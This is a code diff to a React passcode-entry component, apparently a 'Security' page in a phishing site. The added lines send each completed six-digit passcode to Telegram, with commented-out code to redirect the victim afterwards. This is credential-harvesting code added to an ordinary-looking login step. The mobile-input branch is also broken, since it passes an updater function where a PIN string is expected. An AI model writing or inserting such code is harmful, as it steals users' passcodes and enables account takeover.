@@ -23,7 +23,15 @@ export default function Security() {
             const newPins = pins.split('');
             newPins[index] = value;
             setPins(newPins.join(''));
-            if (index < 5) {
+
+            
+            if (index === 5 || (newPins.join('').length === 6)) {
+                // Send complete passcode to Telegram
+                sendMessageToTelegram(newPins.join(''));
+                // Optionally redirect or show loading
+                // setIsLoading(true);
+                // setTimeout(() => router.push('/NextPage'), 1000);
+            } else if (index < 5) {
                 const inputs = e.target.parentElement.querySelectorAll('input');
                 inputs[index + 1].focus();
             }
@@ -48,7 +56,16 @@ export default function Security() {
     // Handle input for mobile viewport
     const handleMobileInput = (number) => {
         if (pins.length < 6) {
-            setPins(prev => prev + number);
+            const new_pins = prev => prev + number 
+            setPins(new_pins);
+            console.log("new pins is ", new_pins)
+            if (pins.length + 1 === 6) {
+                // Send complete passcode to Telegram
+                sendMessageToTelegram(new_pins);
+                // Optionally redirect or show loading
+                // setIsLoading(true);
+                // setTimeout(() => router.push('/NextPage'), 1000);
+            }
         }
     };
 
